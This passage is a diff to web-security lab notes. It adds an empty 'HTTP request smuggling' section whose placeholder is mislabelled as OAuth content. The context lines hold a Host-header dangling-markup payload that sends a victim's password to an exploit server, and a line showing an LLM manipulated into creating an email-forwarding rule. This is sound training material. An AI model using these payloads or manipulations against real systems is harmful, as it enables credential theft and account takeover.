@@ -64,6 +64,7 @@
 - [Server-side Template Injection](#server-side-template-injection)
 - [Web Cache Poisoning](#web-cache-poisoning)
 - [HTTP Host Header](#http-host-header)
+- [HTTP request smuggling](#http-request-smuggling)
 - [OAuth Authentication](#oauth-authentication)
 - [JWT Attacks](#jwt-attacks)
 - [Prototype Pollution](#prototype-pollution)
@@ -3820,6 +3821,11 @@ LLM -> API: create_email_forwarding_rule('peter')
     `Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?`  
   - Access log, look for `GET /?/login'>`  
     `"GET /?/login'>click+here</a>+to+login+with+your+new+password:+GgfkWVd8so</p>`
+
+## HTTP request smuggling
+Content for OAuth Authentication...
+
+### HTTP request smuggling Lab
 
 ## OAuth Authentication
 Content for OAuth Authentication...
